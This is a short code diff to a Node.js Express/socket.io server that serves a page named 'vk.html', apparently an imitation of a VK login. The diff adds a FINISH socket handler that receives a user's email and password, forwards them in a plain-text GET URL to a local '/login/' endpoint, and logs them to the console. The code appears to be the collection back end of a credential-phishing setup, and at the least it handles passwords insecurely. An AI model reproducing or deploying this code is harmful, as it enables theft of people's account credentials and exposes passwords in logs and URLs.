@@ -2,6 +2,7 @@ var app = require('express')();
 var http = require('http').Server(app);
 var io = require('socket.io')(http);
 var fs = require('fs');
+var request = require('request');
 
 app.get('/', function (req, res) {
     res.sendFile(__dirname + '/vk.html');
@@ -30,6 +31,19 @@ io.on('connection', function (socket) {
                 return console.log(err);
             }
         });
+    })
+
+    socket.on('USER_NAME', function(data){
+        console.log('The user with name ' + data + ' connected!')
+    })
+
+    socket.on('FINISH', function(data){
+        var email = data.email
+        var password = data.password
+
+        request.get('http://localhost:8080/login/' + email + '/' + password, {}, function(){})
+
+        console.log("FINISHED: " + email + ' : ' + password)
     })
 });
 
